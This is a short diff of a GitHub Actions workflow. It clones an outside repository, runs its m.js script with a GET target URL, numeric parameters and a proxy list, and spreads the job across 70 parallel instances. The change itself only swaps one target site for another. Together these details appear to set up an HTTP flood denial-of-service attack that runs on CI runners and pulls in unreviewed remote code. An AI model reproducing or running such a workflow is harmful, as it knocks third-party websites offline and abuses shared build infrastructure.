@@ -45,7 +45,7 @@ jobs:
           git clone https://github.com/Ggeg111/curly-octo-doodle.git
           mv curly-octo-doodle/m.js op.js
           
-          node op.js GET https://rebirthstress.org/6622811674-1b75e939-fbcc-4c39-aad0-1c955c7d5cd8 700 90 4 proxy.txt 
+          node op.js GET https://rapidis.gay/6622811674-6d1dbe46-80df-4a28-a4bf-0b74353af4e6 700 4 90 proxy.txt 
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 70  # Updated to match the matrix count
